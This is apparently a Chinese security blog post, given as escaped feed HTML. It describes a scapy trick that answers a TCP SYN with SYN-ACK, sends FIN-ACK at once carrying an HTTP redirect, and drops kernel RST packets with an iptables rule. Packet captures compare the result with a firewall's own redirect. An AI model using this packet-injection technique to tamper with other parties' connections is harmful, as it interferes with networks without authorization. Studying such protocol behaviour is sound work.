&lt;p&gt;使用 scapy 框架，监听一个端口，在接收到 SYN 包之后，按照正常的握手流程返回 SYN-ACK，然后不等接收到 ACK 就继续发送 FIN-ACK，告诉客户端我要断开连接了，然后在这个包中包含有重定向的 HTTP 包。&lt;/p&gt;

&lt;p&gt;在服务器端视角看是这样的&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/789/1.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在客户端视角看是这样的&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/789/3.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;42 号包是代码的重定向，47 号包就是防火墙的重定向，可以看到 TTL 明显不一致，而且 seq 被我们代码扰乱，导致被认为 out-of-order 了。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/789/2.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;因为 scapy 是用户态的，防止内核不知道整个连接流程而发送 rst 包，可以使用下面的命令屏蔽掉&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;iptables -A OUTPUT -p tcp --tcp-flags RST RST -s 172.21.0.3 -j DROP
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;也有人使用内核模块实现了这个功能&lt;/p&gt;

&lt;p&gt;https://github.com/ptpt52/hstshack&lt;/p&gt;</content><author><name>virusdefender</name></author><category term="安全" /><summary type="html">关于 TCP 建立连接和断开连接的流程，很多人都能大致说出来，可以参考协议森林</summary></entry></feed>